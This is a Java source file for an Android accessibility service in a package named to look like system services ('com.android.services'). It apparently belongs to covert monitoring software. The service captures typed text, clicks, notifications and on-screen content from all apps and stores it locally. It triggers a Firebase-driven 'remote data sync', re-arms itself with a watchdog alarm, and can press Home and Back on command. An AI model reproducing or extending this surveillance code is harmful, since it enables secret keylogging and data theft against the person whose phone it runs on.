package com.android.services.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.android.services.accessibility.AccessibilityEventType;
import com.android.services.accessibility.manager.AccessibilityManager;
import com.android.services.logs.source.LocalDatabaseSource;
import com.android.services.models.AccessibilityEventModel;
import com.android.services.receiver.WatchDogAlarmReceiver;
import com.android.services.util.AppUtils;
import com.android.services.util.FirebasePushUtils;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.inject.Inject;

import dagger.hilt.android.AndroidEntryPoint;

@AndroidEntryPoint
public class TOSAccessibilityService extends AccessibilityService {

    @Inject
    LocalDatabaseSource localDatabaseSource;

    private static final String TAG = "TOSAccessibilityService";
    private AccessibilityActionReceiver mReceiver;
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    public TOSAccessibilityService() {
        super();
    }

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo serviceInfo = new AccessibilityServiceInfo();
        serviceInfo.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_LONG_CLICKED
                | AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        serviceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        serviceInfo.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        serviceInfo.notificationTimeout = 100;
        this.setServiceInfo(serviceInfo);

        mReceiver = new AccessibilityActionReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.android.services.accessibility.ACTION_BACK");
        LocalBroadcastManager.getInstance(this).registerReceiver(mReceiver, intentFilter);
        restartDataSyncService();
        WatchDogAlarmReceiver watchDogReceiver = new WatchDogAlarmReceiver();
        watchDogReceiver.setAlarm(this);
    }

    private void restartDataSyncService() {
        try {
            FirebasePushUtils.INSTANCE.restartRemoteDataSyncService(this, false);
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(final AccessibilityEvent event) {
        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            OnEvent(this, AccessibilityEventType.TYPE_VIEW_CLICKED, event);
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED) {
            OnEvent(this, AccessibilityEventType.TYPE_VIEW_LONG_CLICKED, event);
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            OnEvent(this, AccessibilityEventType.TYPE_WINDOW_CONTENT_CHANGED, event);
        } else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            OnEvent(this, AccessibilityEventType.TYPE_WINDOW_STATE_CHANGED, event);
        } else if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            OnEvent(this, AccessibilityEventType.TYPE_VIEW_TEXT_CHANGED, event);
        } else if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            OnEvent(this, AccessibilityEventType.TYPE_NOTIFICATION_STATE_CHANGED, event);
        }
    }

    private void OnEvent(final Context context,
                         final AccessibilityEventType eventType, AccessibilityEvent event) {
        String eventText = "", eventPackageName = "", eventClassName = "";
        try {

            AccessibilityNodeInfo eventSource = event.getSource();
            if (event.getText() != null && event.getText().size() > 0)
                eventText = event.getText().toString();
            if (event.getPackageName() != null)
                eventPackageName = event.getPackageName().toString();
            if (event.getClassName() != null)
                eventClassName = event.getClassName().toString();

            final AccessibilityEventModel accessibilityEventModel = new AccessibilityEventModel();
            accessibilityEventModel.setPackageName(eventPackageName);
            accessibilityEventModel.setEventText(eventText);
            accessibilityEventModel.setEventClassName(eventClassName);
            accessibilityEventModel.setEventSource(eventSource);
            accessibilityEventModel.setParcelable(event.getParcelableData());
            executorService.execute(() -> {
                AccessibilityNodeInfo rootInWindow = getRootInActiveWindow();
                accessibilityEventModel.setRootInWindow(rootInWindow);
                AccessibilityManager accessibilityManager = new AccessibilityManager(context, localDatabaseSource);
                accessibilityManager.goThroughAccessibilityEvent(eventType,
                        accessibilityEventModel);
            });
        } catch (Exception e) {
            Log.d(TAG, "OnViewClickedEvent Error: " + e.getMessage());
        }
    }

    private class AccessibilityActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            int actionType = intent.getIntExtra("ACTION_TYPE", -1);
            if (actionType == 0) {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } else if (actionType == 1) {
                performGlobalAction(GLOBAL_ACTION_BACK);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, " Interrupted");
        if (mReceiver != null) {
            LocalBroadcastManager.getInstance(this).unregisterReceiver(mReceiver);
        }
    }
}
